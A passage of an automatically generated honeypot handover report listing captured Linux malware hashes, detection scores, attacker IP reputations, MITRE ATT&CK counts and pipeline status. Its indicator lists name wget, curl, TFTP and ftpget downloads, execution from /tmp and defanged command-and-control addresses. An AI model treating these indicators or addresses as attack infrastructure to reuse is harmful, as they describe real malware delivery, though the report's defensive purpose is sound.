| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 62/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 80/100 | 🔴 HIGH | **26/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 41/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 64/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 77/100 | 🔴 HIGH | **19/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `106.12.172[.]151` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 7 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `66.132.172[.]182` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `122.168.123[.]73` | IN | 1 Malviya Nagar, | **100** ⚠️ | 30 |
| `92.118.39[.]50` | RO | DMZHOST | **100** ⚠️ | 17 |
| `140.245.50[.]204` | SG | Oracle Corporation | **100** ⚠️ | 1 |
| `185.242.3[.]121` | DE | Felcloud | **100** ⚠️ | 14 |
| `45.198.224[.]120` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 4 |
| `120.27.128[.]176` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 2 |
| `138.59.233[.]5` | BR | RZ NET LTDA. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 132 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 115 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 57 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |

---

## 🔕 False Positive Summary (83 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 81 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 237 cases |
| Tool 34  | Credential Extractor        | ✅ 119 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 38 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 83 filtered (35.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 30 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 115 priority case(s) shown individually · 19 recon entry/entries in table (8 group(s) consolidating 28 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-04T06:50:56Z_
